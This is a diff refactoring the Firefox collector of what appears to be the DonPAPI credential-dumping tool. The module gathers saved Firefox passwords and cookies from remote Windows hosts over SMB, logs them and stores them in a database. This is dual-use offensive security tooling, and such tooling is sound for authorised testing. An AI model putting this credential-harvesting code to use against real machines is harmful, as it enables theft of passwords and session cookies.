@@ -36,44 +36,35 @@ class FirefoxCookie:
     creation_utc:str
     expires_utc:str
     last_access_utc:str
-   
-TAG = "Firefox"
 
-class FirefoxDump:
+
+class Firefox:
     firefox_generic_path = "Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
-    false_positive = (
-        ".",
-        "..",
-        "desktop.ini",
-        "Public",
-        "Default",
-        "Default User",
-        "All Users",
-        ".NET v4.5", 
-        ".NET v4.5 Classic"
-    )
 
-    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
+    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
+        self.tag = self.__class__.__name__
         self.target = target
         self.conn = conn
         self.masterkeys = masterkeys
         self.options = options
         self.logger = logger
         self.context = context
+        self.false_positive = false_positive
+        self.max_filesize = max_filesize
 
     def run(self):
         self.logger.display("Dumping User Firefox Browser")
         firefox_credentials, firefox_cookies = self.collect()
         for credential in firefox_credentials:
             url = credential.url + " -" if credential.url != "" else "-"
-            self.logger.secret(f"[{credential.winuser}] [Password] {url} {credential.username}:{credential.password}", TAG)
-            self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user=credential.winuser, username=credential.username, password=credential.password, target=credential.url)
+            self.logger.secret(f"[{credential.winuser}] [Password] {url} {credential.username}:{credential.password}", self.tag)
+            self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.username, password=credential.password, target=credential.url)
         for cookie in firefox_cookies:
             if cookie.cookie_value != "":
-                self.logger.secret(f"[{cookie.winuser}] [Cookie] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}",TAG)
+                self.logger.secret(f"[{cookie.winuser}] [Cookie] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}",self.tag)
                 self.context.db.add_cookie(
                     computer=self.context.host,
-                    browser=TAG,
+                    browser=self.tag,
                     windows_user=cookie.winuser,
                     url=f"{cookie.host}{cookie.path}",
                     cookie_name=cookie.cookie_name,
